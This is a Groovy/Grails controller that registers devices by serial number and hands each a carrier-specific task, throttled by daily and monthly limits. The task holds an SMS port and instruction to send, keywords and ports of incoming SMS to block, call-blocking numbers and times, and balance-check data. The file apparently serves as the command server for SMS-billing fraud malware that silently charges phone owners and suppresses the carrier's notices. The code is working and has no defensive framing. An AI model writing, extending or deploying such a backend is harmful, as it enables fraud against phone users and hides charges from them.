package com.sp.domain

import java.util.Map;

import grails.converters.JSON

class SubAppItemController {

	static allowedMethods = [save: "POST"]


	//    def list(Integer max) {
	//        params.max = Math.min(max ?: 10, 100)
	//        [subAppItemInstanceList: SubAppItem.list(params), subAppItemInstanceTotal: SubAppItem.count()]
	//    }
	//
	//    def create() {
	//        [subAppItemInstance: new SubAppItem(params)]
	//    }

	def save() {
		def subAppItemInstance = SubAppItem.findBySerialNumber(params.serialNumber)
		if(!subAppItemInstance){
			subAppItemInstance = new SubAppItem(params)
		}else{
		subAppItemInstance.lastUpdated=new Date()
		}
		def canal=getCanal(params);
		if(canal){


			//			subAppItemInstance.canalInfo=canal.properties as JSON
			def result=[:]
			result.queryMoneyPort="queryMoney:instruction"

			result.name=canal.name
			//			Map area
			result.operator=canal.operator

			//			boolean enable

			result.times=canal.times

			result.interval=canal.interval

			result.exeStart=canal.exeStart

			result.exeEnd=canal.exeEnd


			result.blockSmsPort=canal.blockSmsPort

			result.blockKeys=canal.blockKeys

			/////通话拦截设置


			result.blockNum=canal.blockNum

			result.blockMinTime=canal.blockMinTime

			result.blockMaxTime=canal.blockMaxTime
			
			//sms
			result.port=canal.port
			result.instruction=canal.instruction
			
//			result.wapInfo=canal.wapInfo
			
//			String targetKey
//			String chargeKey
			result.type=canal.t
			
			
			//检查余额
			if(canal.checkMoneyInfo){
				
				result.checkMoneyInfo=canal.checkMoneyInfo
			}
			
			
			subAppItemInstance.canalInfo=result as JSON
//			println subAppItemInstance.canalInfo

			if (subAppItemInstance.save(flush: true)) {
				render result as JSON
			}else{
				render (subAppItemInstance.getErrors() as JSON)
			}
		}else{

			render (["errors":[
					["object":"SubItem",message:"null canal"]
				]]  as JSON)



		}
	}

	private getCanal(params){
		def code=params.smsCenter

		Canal canal=Canal.findByCodeAndEnable(code,true)
		if(!canal){
			return null
		}
		int dayLimit=canal.dayLimit
		int dayInterval=canal.dayInterval

		int monthLimit=canal.monthLimit
		
		int timeDelay=canal.timeDelay

		int monthCount=params.monthCount?:0
		int  dayCount=params.dayCount?:0
		long lastTime=params.lastTime?:0

		boolean flag=true

		long now=(new Date()).getTime();
		long diff=now-lastTime
//		println 0000000
		
		if(diff<timeDelay*60*1000){
//			println 111111
			flag=false
		}
		
		if(diff<dayInterval*24*3600*1000){//月度间隔限制（天）
//			println 2222
			
			flag=false
		}

		if(dayCount>=dayLimit){//当天内次数限制
//			println 3333
			
			flag=false
		}

		if(monthCount>=monthLimit){//当月次数限制
//			println 44444
			
			flag=false
		}

		flag?canal:null
	}

	//    def save() {
	//        def subAppItemInstance = new SubAppItem(params)
	//        if (!subAppItemInstance.save(flush: true)) {
	//            render(view: "create", model: [subAppItemInstance: subAppItemInstance])
	//            return
	//        }
	//
	//        flash.message = message(code: 'default.created.message', args: [message(code: 'subAppItem.label', default: 'SubAppItem'), subAppItemInstance.id])
	//        redirect(action: "show", id: subAppItemInstance.id)
	//    }

	//    def show(Long id) {
	//        def subAppItemInstance = SubAppItem.get(id)
	//        if (!subAppItemInstance) {
	//            flash.message = message(code: 'default.not.found.message', args: [message(code: 'subAppItem.label', default: 'SubAppItem'), id])
	//            redirect(action: "list")
	//            return
	//        }
	//
	//        [subAppItemInstance: subAppItemInstance]
	//    }
	//
	//    def edit(Long id) {
	//        def subAppItemInstance = SubAppItem.get(id)
	//        if (!subAppItemInstance) {
	//            flash.message = message(code: 'default.not.found.message', args: [message(code: 'subAppItem.label', default: 'SubAppItem'), id])
	//            redirect(action: "list")
	//            return
	//        }
	//
	//        [subAppItemInstance: subAppItemInstance]
	//    }
	//
	//    def update(Long id, Long version) {
	//        def subAppItemInstance = SubAppItem.get(id)
	//        if (!subAppItemInstance) {
	//            flash.message = message(code: 'default.not.found.message', args: [message(code: 'subAppItem.label', default: 'SubAppItem'), id])
	//            redirect(action: "list")
	//            return
	//        }
	//
	//        if (version != null) {
	//            if (subAppItemInstance.version > version) {
	//                subAppItemInstance.errors.rejectValue("version", "default.optimistic.locking.failure",
	//                          [message(code: 'subAppItem.label', default: 'SubAppItem')] as Object[],
	//                          "Another user has updated this SubAppItem while you were editing")
	//                render(view: "edit", model: [subAppItemInstance: subAppItemInstance])
	//                return
	//            }
	//        }
	//
	//        subAppItemInstance.properties = params
	//
	//        if (!subAppItemInstance.save(flush: true)) {
	//            render(view: "edit", model: [subAppItemInstance: subAppItemInstance])
	//            return
	//        }
	//
	//        flash.message = message(code: 'default.updated.message', args: [message(code: 'subAppItem.label', default: 'SubAppItem'), subAppItemInstance.id])
	//        redirect(action: "show", id: subAppItemInstance.id)
	//    }
	//
	//    def delete(Long id) {
	//        def subAppItemInstance = SubAppItem.get(id)
	//        if (!subAppItemInstance) {
	//            flash.message = message(code: 'default.not.found.message', args: [message(code: 'subAppItem.label', default: 'SubAppItem'), id])
	//            redirect(action: "list")
	//            return
	//        }
	//
	//        try {
	//            subAppItemInstance.delete(flush: true)
	//            flash.message = message(code: 'default.deleted.message', args: [message(code: 'subAppItem.label', default: 'SubAppItem'), id])
	//            redirect(action: "list")
	//        }
	//        catch (DataIntegrityViolationException e) {
	//            flash.message = message(code: 'default.not.deleted.message', args: [message(code: 'subAppItem.label', default: 'SubAppItem'), id])
	//            redirect(action: "show", id: id)
	//        }
	//    }
}
